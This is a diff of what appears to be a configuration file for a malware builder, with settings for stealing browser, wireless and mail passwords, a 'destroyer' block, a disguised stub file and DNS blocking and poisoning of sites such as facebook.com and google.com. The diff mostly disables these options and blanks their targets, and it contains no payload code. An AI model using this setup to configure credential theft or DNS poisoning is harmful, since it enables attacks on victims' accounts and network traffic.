@@ -1,9 +1,8 @@
 # ->initializing controls
-exec_mode = "normal"
 uac_elevation = 0
 duplicate_exec = 1
-stub = "media.mp4"
-logging = 1
+stub = "media.txt"
+logging = 0
 
 # ->completion controls
 msgbox = {
@@ -19,8 +18,10 @@ power = {
     'timeout': "999"
 }
 
+sound = 1
+
 # ->password recovery
-browser_pwds = 1
+browser_pwds = 0
 wireless_keys = 0
 email_pst_pwds = 0
 mail_pwds = 0
@@ -83,18 +84,18 @@ destroyer = {
 local_exec = 0
 target_exec = {
     'controller': 0,
-    'path': "C:\\Users\\Abdulrahim\\Desktop\\folder"
+    'path': ""
 }
 
 # ->DNS based attacks
 dns_halt = {
     'controller': 0,
     'clear': 1,
-    'entries': "www.facebook.com"
+    'entries': ""
 }
 
 dns_poison = {
     'controller': 0,
     'clear': 1,
-    'entries': "8.8.8.8 www.facebook.com, 1.1.1.1 www.google.com"
+    'entries': ""
 }
